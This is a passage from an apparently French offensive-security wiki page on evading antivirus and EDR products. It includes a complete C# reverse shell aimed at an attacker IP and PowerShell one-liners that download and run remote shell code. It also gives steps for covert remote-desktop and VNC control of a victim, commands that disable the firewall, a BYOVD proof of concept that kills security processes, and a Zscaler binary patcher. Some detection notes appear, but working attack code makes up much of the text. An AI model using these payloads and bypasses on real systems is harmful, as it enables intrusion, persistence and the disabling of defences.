- [**obfy**](https://github.com/fritzone/obfy): Ajoute une couche d’opérations obfusquées générées par le framework de métaprogrammation par templates de C++, ce qui compliquera un peu la tâche de quiconque voudrait cracker l’application.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz est un obfuscateur de binaires x64 capable d’obfusquer différents fichiers PE, notamment les fichiers .exe, .dll et .sys.
- [**metame**](https://github.com/a0rtega/metame): Metame est un moteur de code métamorphique simple pour les exécutables arbitraires.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator est un framework d’obfuscation de code à granularité fine pour les langages pris en charge par LLVM, utilisant ROP (return-oriented programming). ROPfuscator obfusque un programme au niveau du code assembleur en transformant les instructions ordinaires en chaînes ROP, ce qui contrecarrer notre conception naturelle du flux de contrôle normal.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt est un crypter PE .NET écrit en Nim.
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor peut convertir des EXE/DLL existants en shellcode, puis les charger.

### Masquage automatique par fonction assisté par le compilateur LLVM

Au lieu de masquer un implant entier uniquement pendant son inactivité, un backend LLVM X86 modifié peut maintenir certaines fonctions masquées par XOR lorsqu’elles sont inactives. La PoC Function Peekaboo sélectionne les noms démanglés contenant `REG_`, injecte des stubs d’entrée et de sortie indépendants de la position autour du code machine final et émet un gestionnaire de masquage partagé dans `.text` ; les signatures au niveau du code source et la convention d’appel Windows x64 restent inchangées.<sup>[[38]](#references)[[39]](#references)</sup>

#### Transformation du flux de contrôle du backend

Cette opération doit être effectuée après la sélection des instructions et l’optimisation, car la transformation doit couvrir **chaque retour émis** et connaître la disposition exacte du code x86. Un `MachineFunctionPass` exécuté avant l’émission recherche le dernier `MachineInstr::isReturn()`, le supprime afin que le chemin final tombe dans l’épilogue ajouté, et remplace les retours précédents par `JMP_1 handler`. Conservez toute restauration de pile/de frame générée par le compilateur avant chaque retour ; ne redirigez que l’instruction de retour elle-même.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` et `emitFunctionBodyEnd()` émettent les stubs propres à chaque fonction, tandis que `emitEndOfAsmFile()` émet le gestionnaire. Des symboles partagés entre les étapes d’émission permettent à un branchement de prologue de cibler son épilogue ultérieur ; pour un `je` proche émis manuellement, écrivez `0F 84` suivi de l’expression MC de quatre octets `target - address_after_je`. Les appels et les sauts vers le gestionnaire peuvent plutôt être émis sous forme d’objets `MCInst` (`CALL64pcrel32` et `JMP_1`). Un pass doit renvoyer `false` pour une fonction non sélectionnée s’il n’a rien modifié ; la PoC renvoie incorrectement `true` dans ce cas.<sup>[[38]](#references)[[39]](#references)</sup>

#### Métadonnées et initialisation pré-CRT

La PoC place une clé XOR et des enregistrements de 16 octets contenant un pointeur de fonction relocalisé par le loader ainsi qu’une longueur d’exécution dans `.funcmeta`. Bien que le champ C soit un `uint32_t`, le gestionnaire accède à un QWORD à l’offset `+8` de l’enregistrement, consommant la longueur et son remplissage, puis avance de `0x10` octets entre les enregistrements. Les noms de sections PE ne font que huit octets ; la recherche à l’exécution voit donc `.funcmet`. Un patcher externe ajoute un `.stub` exécutable, enregistre l’ancien RVA du point d’entrée dans le stub et redirige `AddressOfEntryPoint` ; le stub PIC obtient la base de l’image depuis `gs:[0x60]` → `[PEB+0x10]`, parcourt les imports PE32+ pour résoudre un `VirtualProtect` déjà importé et s’exécute avant le CRT.<sup>[[38]](#references)[[39]](#references)</sup>

L’initialisation définit une valeur sentinelle dans `gs:[0xE8]` et appelle chaque fonction de métadonnées. Son prologue, toujours lisible, enregistre le début de la fonction dans `gs:[0xF0]`, détecte la sentinelle et ignore le corps encore démasqué. L’épilogue utilise ensuite `call handler` ; après que le gestionnaire a sauvegardé 13 registres (`0x68` octets), l’adresse de retour à `[rsp+0x68]` correspond à la fin de la fonction transformée. `end - start` peut donc être écrit dans l’enregistrement de métadonnées correspondant. Le stub efface la sentinelle et saute à `ImageBase + original_entry_point_RVA` une fois tous les corps masqués.<sup>[[38]](#references)[[39]](#references)</sup>

Lors d’un appel normal, le prologue appelle le même gestionnaire symétrique pour décoder le corps. Le chemin final tombe dans l’épilogue ajouté, tandis que chaque retour précédent saute directement vers le gestionnaire partagé. L’épilogue normal utilise également `jmp handler` plutôt que `call`, de sorte qu’après le remasquage, le `ret` du gestionnaire consomme l’adresse de retour de l’appelant d’origine et préserve le résultat de la fonction dans `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Primitive de masquage et indicateurs d’analyse

Le gestionnaire trouve l’enregistrement courant, saute le prologue visible de taille fixe (ici `0x46` octets), passe le reste en `PAGE_EXECUTE_READWRITE`, applique un XOR octet par octet avec l’octet de poids faible de la clé, puis le repasse en `PAGE_EXECUTE_READ`. La même boucle décode donc à l’entrée et encode à chaque sortie normale.<sup>[[38]](#references)[[39]](#references)</sup>

Les indicateurs à forte valeur de détection de cette conception comprennent :<sup>[[38]](#references)[[39]](#references)</sup>

- un point d’entrée dans un `.stub` exécutable et une section `.funcmet` contenant une clé et des pointeurs `.text` relocalisés ;
- l’analyse pré-CRT du PEB, de la table d’importation et de la table des sections, suivie d’appels via chaque pointeur de métadonnées ;
- des prologues PIC `call`/`pop` identiques et de nombreux points de retour redirigés vers un seul gestionnaire ;
- des écritures dans `gs:[0xE8]`, `gs:[0xF0]` et `gs:[0xF8]`, suivies de transitions répétées de `VirtualProtect` et d’écritures XOR octet par octet dans des pages exécutables adossées à l’image.

Il s’agit d’une technique d’évasion des scanners mémoire, et non d’une protection cryptographique : le fichier patché contient toujours le corps original en clair, et un débogueur peut placer un point d’arrêt sur `VirtualProtect` ou la boucle XOR et vider la fonction active. Le XOR sur un seul octet, les métadonnées lisibles et la limite fixe `0x46` rendent également la récupération hors ligne simple.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> Les emplacements TEB de la PoC sont propres à chaque thread, mais les pages de code modifiées sont partagées par tout le processus. Une entrée concurrente ou récursive peut donc réactiver les instructions pendant qu’une autre invocation les exécute ; les exceptions et les sorties non locales peuvent également contourner le remasquage. Une implémentation robuste doit synchroniser les transitions, restaurer la protection réellement renvoyée via `lpflOldProtect`, éviter les longueurs de stub codées en dur, vérifier l’alignement de la pile x64 pour les chemins `call` et `jmp`, et appeler `FlushInstructionCache` après avoir réécrit des octets exécutables. Microsoft indique explicitement qu’il incombe à l’appelant d’assurer la cohérence du cache d’instructions lorsque du code exécutable est modifié.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

Vous avez peut-être déjà vu cet écran en téléchargeant certains exécutables depuis Internet et en les lançant.

Microsoft Defender SmartScreen est un mécanisme de sécurité destiné à protéger l’utilisateur final contre l’exécution d’applications potentiellement malveillantes.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen repose principalement sur une approche fondée sur la réputation : les applications rarement téléchargées déclenchent SmartScreen, qui alerte l’utilisateur final et l’empêche d’exécuter le fichier (bien qu’il puisse tout de même l’exécuter en cliquant sur More Info -> Run anyway).

**MoTW** (Mark of The Web) est un [flux de données alternatif NTFS](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) nommé Zone.Identifier, créé automatiquement lors du téléchargement de fichiers depuis Internet, avec l’URL d’origine du téléchargement.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Vérification du flux de données alternatif Zone.Identifier d’un fichier téléchargé depuis Internet.</p></figcaption></figure>

> [!TIP]
> Notez que les exécutables signés avec un certificat de signature **de confiance** **ne déclencheront pas SmartScreen**.

Une méthode très efficace pour empêcher vos payloads de recevoir le Mark of The Web consiste à les placer dans un conteneur, comme une image ISO. En effet, le Mark-of-the-Web (MOTW) **ne peut pas** être appliqué aux volumes **non NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) est un outil qui place des payloads dans des conteneurs de sortie afin de contourner Mark-of-the-Web.

Exemple d’utilisation :

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Voici une démonstration de contournement de SmartScreen en empaquetant des payloads dans des fichiers ISO à l’aide de [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) est un puissant mécanisme de journalisation de Windows qui permet aux applications et aux composants système de **journaliser des événements**. Cependant, il peut également être utilisé par les produits de sécurité pour surveiller et détecter les activités malveillantes.

Comme pour désactiver (contourner) AMSI, il est également possible de faire en sorte que la fonction **`EtwEventWrite`** du processus en espace utilisateur retourne immédiatement sans journaliser aucun événement. Pour cela, la fonction est patchée en mémoire afin qu’elle retourne immédiatement, ce qui désactive effectivement la journalisation ETW pour ce processus.

Vous trouverez plus d’informations dans **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) et [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Le chargement de binaires C# en mémoire est connu depuis un certain temps et reste un très bon moyen d’exécuter vos outils de post-exploitation sans être détecté par l’AV.

Comme le payload sera chargé directement en mémoire sans toucher au disque, nous n’aurons qu’à nous soucier de patcher AMSI pour l’ensemble du processus.

La plupart des frameworks C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) permettent déjà d’exécuter des assemblies C# directement en mémoire, mais il existe différentes façons de procéder :

- **Fork\&Run**

Cette méthode consiste à **lancer un nouveau processus sacrificiel**, à y injecter votre code malveillant de post-exploitation, à l’exécuter puis, une fois terminé, à arrêter le nouveau processus. Cette méthode présente des avantages et des inconvénients. Son avantage est que l’exécution a lieu **en dehors** du processus de notre implant Beacon. Cela signifie que si une opération de post-exploitation échoue ou est détectée, il y a **beaucoup plus de chances** que notre **implant survive**. En revanche, cette méthode augmente les **risques** d’être détecté par les **détections comportementales**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Cette méthode consiste à injecter le code malveillant de post-exploitation **dans son propre processus**. Ainsi, vous évitez de créer un nouveau processus et de le faire analyser par l’AV. En revanche, si l’exécution de votre payload échoue, il y a **beaucoup plus de chances** de **perdre votre beacon**, car il pourrait planter.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Pour en savoir plus sur le chargement de C# Assembly, consultez cet article [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) et leur BOF InlineExecute-Assembly ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Vous pouvez également charger des C# Assemblies **depuis PowerShell**. Consultez [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) et la [vidéo de S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Utiliser d’autres langages de programmation

Comme proposé dans [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), il est possible d’exécuter du code malveillant dans d’autres langages en donnant à la machine compromise accès **à l’environnement d’interpréteur installé sur le partage SMB contrôlé par l’attaquant**.

En donnant accès aux binaires de l’interpréteur et à l’environnement sur le partage SMB, vous pouvez **exécuter du code arbitraire dans ces langages en mémoire** sur la machine compromise.

Le dépôt indique : Defender analyse toujours les scripts, mais l’utilisation de Go, Java, PHP, etc. offre **plus de flexibilité pour contourner les signatures statiques**. Les tests avec des scripts de reverse shell aléatoires et non obfusqués dans ces langages ont donné de bons résultats.

## TokenStomping

Le TokenStomping manipule le jeton d’accès d’un produit de sécurité tel qu’un EDR ou un AV. Réduire les privilèges du jeton peut laisser le processus en cours d’exécution tout en l’empêchant d’effectuer des actions d’inspection ou de remédiation nécessitant des privilèges.

Pour éviter cela, Windows pourrait **empêcher les processus externes** d’obtenir des handles sur les jetons des processus de sécurité.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Utiliser des logiciels de confiance

### Chrome Remote Desktop

Comme expliqué dans [**cet article de blog**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), il est facile de déployer Chrome Remote Desktop sur le PC d’une victime, puis de l’utiliser pour en prendre le contrôle et maintenir la persistance :<sup>[[35]](#references)</sup>
1. Téléchargez le logiciel depuis https://remotedesktop.google.com/, cliquez sur « Set up via SSH », puis sur le fichier MSI pour Windows afin de télécharger le fichier MSI.
2. Exécutez silencieusement le programme d’installation sur la machine de la victime (droits d’administrateur requis) : `msiexec /i chromeremotedesktophost.msi /qn`
3. Retournez sur la page Chrome Remote Desktop et cliquez sur Suivant. L’assistant vous demandera alors de vous autoriser ; cliquez sur le bouton Authorize pour continuer.
4. Exécutez la commande fournie en effectuant les ajustements nécessaires : `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (le paramètre `--pin` définit le PIN sans utiliser l’interface graphique).
 

## Évasion avancée

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

L’évasion est un sujet très complexe. Il faut parfois prendre en compte de nombreuses sources de télémétrie au sein d’un même système ; il est donc presque impossible de rester complètement indétecté dans des environnements matures.

Chaque environnement auquel vous vous attaquerez aura ses propres forces et faiblesses.

Je vous encourage vivement à regarder cette présentation de [@ATTL4S](https://twitter.com/DaniLJ94) pour vous familiariser avec des techniques d’évasion plus avancées.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Voici également une autre excellente présentation de [@mariuszbit](https://twitter.com/mariuszbit) sur l’évasion en profondeur.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Anciennes techniques**

### **Vérifier quelles parties Defender détecte comme malveillantes**

Vous pouvez utiliser [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), qui **supprime des parties du binaire** jusqu’à **découvrir quelle partie Defender** considère comme malveillante, puis vous l’indique.\
Un autre outil qui fait **la même chose est** [**avred**](https://github.com/dobin/avred), qui propose ce service sur le Web à l’adresse [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Serveur Telnet**

Jusqu’à Windows 10, toutes les versions de Windows incluaient un **serveur Telnet** que vous pouviez installer (en tant qu’administrateur) en exécutant :

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Faites-le **démarrer** au démarrage du système et **exécutez-le** maintenant :

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Modifier le port telnet** (stealth) et désactiver le pare-feu :

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Téléchargez-le depuis : [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (choisissez les téléchargements binaires, pas le setup)

**SUR L’HÔTE** : Exécutez _**winvnc.exe**_ et configurez le serveur :

- Activez l’option _Disable TrayIcon_
- Définissez un mot de passe dans _VNC Password_
- Définissez un mot de passe dans _View-Only Password_

Ensuite, déplacez le binaire _**winvnc.exe**_ et le fichier _**UltraVNC.ini**_ nouvellement créé sur la **victime**

#### **Connexion inversée**

L’**attaquant** doit **exécuter sur son** **hôte** le binaire `vncviewer.exe -listen 5900` afin d’être **prêt** à recevoir une **connexion VNC** inversée. Ensuite, sur la **victime** : démarrez le daemon winvnc avec `winvnc.exe -run` et exécutez `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**AVERTISSEMENT :** Pour rester furtif, vous ne devez pas faire certaines choses

- Ne démarrez pas `winvnc` s’il est déjà en cours d’exécution, sinon vous déclencherez un [popup](https://i.imgur.com/1SROTTl.png). Vérifiez s’il est en cours d’exécution avec `tasklist | findstr winvnc`
- Ne démarrez pas `winvnc` sans `UltraVNC.ini` dans le même répertoire, sinon la [fenêtre de configuration](https://i.imgur.com/rfMQWcf.png) s’ouvrira
- N’exécutez pas `winvnc -h` pour obtenir de l’aide, sinon vous déclencherez un [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Téléchargez-le depuis : [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

Dans GreatSCT :

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Maintenant, **démarrez le lister** avec `msfconsole -r file.rc` et **exécutez** le **payload xml** avec :

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Le Defender actuel terminera le processus très rapidement.**

### Compiler notre propre reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Premier Revershell C#

Compilez-le avec :

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Utilisez-le avec :

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# avec un compilateur

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Téléchargement et exécution automatiques :

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Liste d’obfuscateurs C# : [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Utiliser Python pour créer des exemples d'injecteurs :

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Autres outils

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Plus

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Éliminer les AV/EDR depuis l’espace noyau

Storm-2603 a utilisé un petit utilitaire en console connu sous le nom d’**Antivirus Terminator** pour désactiver les protections des endpoints avant de déposer un ransomware. L’outil apporte son **propre pilote vulnérable mais *signé*** et en abuse pour exécuter des opérations privilégiées dans le noyau, que même les services AV Protected-Process-Light (PPL) ne peuvent pas bloquer.<sup>[[12]](#references)</sup>

Points clés
1. **Pilote signé** : Le fichier déposé sur le disque est `ServiceMouse.sys`, mais le binaire est le pilote légitimement signé `AToolsKrnl64.sys` de la « System In-Depth Analysis Toolkit » d’Antiy Labs. Comme le pilote porte une signature Microsoft valide, il se charge même lorsque Driver-Signature-Enforcement (DSE) est activé.
2. **Installation du service** :
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   La première ligne enregistre le pilote en tant que **service du noyau**, et la deuxième le démarre afin que `\\.\ServiceMouse` soit accessible depuis l’espace utilisateur.
3. **IOCTL exposés par le pilote**
   | Code IOCTL | Capacité                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Terminer un processus arbitraire par PID (utilisé pour tuer les services Defender/EDR) |
   | `0x990000D0` | Supprimer un fichier arbitraire sur le disque |
   | `0x990001D0` | Décharger le pilote et supprimer le service |

   Preuve de concept minimale en C :
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Pourquoi cela fonctionne** : BYOVD contourne entièrement les protections en mode utilisateur ; le code exécuté dans le noyau peut ouvrir des processus *protégés*, les terminer ou altérer des objets du noyau, quels que soient PPL/PP, ELAM ou les autres fonctionnalités de durcissement.

Détection / Atténuation
•  Activez la liste de blocage des pilotes vulnérables de Microsoft (`HVCI`, `Smart App Control`) afin que Windows refuse de charger `AToolsKrnl64.sys`.
•  Surveillez la création de nouveaux services *kernel* et déclenchez une alerte lorsqu’un pilote est chargé depuis un répertoire accessible en écriture à tous ou absent de la liste d’autorisation.
•  Surveillez les handles en mode utilisateur vers des objets de périphérique personnalisés, suivis d’appels `DeviceIoControl` suspects.

### Contourner les vérifications de posture de Zscaler Client Connector par patching de binaires sur disque

**Client Connector** de Zscaler applique localement des règles de posture de l’appareil et s’appuie sur Windows RPC pour communiquer les résultats aux autres composants. Deux choix de conception peu robustes rendent un contournement complet possible :

1. L’évaluation de la posture se déroule **entièrement côté client** (un booléen est envoyé au serveur).
2. Les points de terminaison RPC internes vérifient uniquement que l’exécutable qui se connecte est **signé par Zscaler** (via `WinVerifyTrust`).<sup>[[11]](#references)</sup>

En **patchant quatre binaires signés sur disque**, les deux mécanismes peuvent être neutralisés :

| Binaire | Logique d’origine patchée | Résultat |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Renvoie toujours `1`, donc chaque vérification est conforme |
| `ZSAService.exe` | Appel indirect à `WinVerifyTrust` | NOP-ed ⇒ tout processus (même non signé) peut se connecter aux pipes RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Remplacé par `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Vérifications d’intégrité du tunnel | Court-circuitées |

Extrait minimal du patcher :

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Après avoir remplacé les fichiers d’origine et redémarré la pile de services :

* **Tous** les contrôles de posture s’affichent en vert/conformes.
* Des binaires non signés ou modifiés peuvent ouvrir les endpoints RPC de canal nommé (p. ex. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* L’hôte compromis obtient un accès sans restriction au réseau interne défini par les politiques Zscaler.

Cette étude de cas montre comment quelques modifications d’octets peuvent contourner des décisions de confiance purement côté client et de simples vérifications de signature.

## Abus de fonctionnalités de confiance du pilote Microsoft Defender `BTR.sys`

Le pilote **Boot-Time Removal** de Defender constitue un contre-exemple utile au BYOVD classique. `BTR.sys` est un composant de remédiation légitime, signé par Microsoft, qui ne présente aucune vulnérabilité de corruption mémoire et ne possède aucune interface IOCTL ; après avoir obtenu un accès administrateur et `SeLoadDriverPrivilege`, un opérateur peut plutôt falsifier sa transaction privée de remédiation et effectuer les opérations prévues sur les fichiers et le registre en Ring-0. Il s’agit d’un **mécanisme de neutralisation d’AV/EDR après compromission, et non d’un accès initial ou d’une élévation de privilèges** ; le pilote peut être extrait de la ressource `BOOTTIMETOOL` du propre `MpEngine.dll` de la cible, plutôt que d’importer un pilote tiers voyant.<sup>[[36]](#references)</sup>

### Préparation du pilote à exécution unique

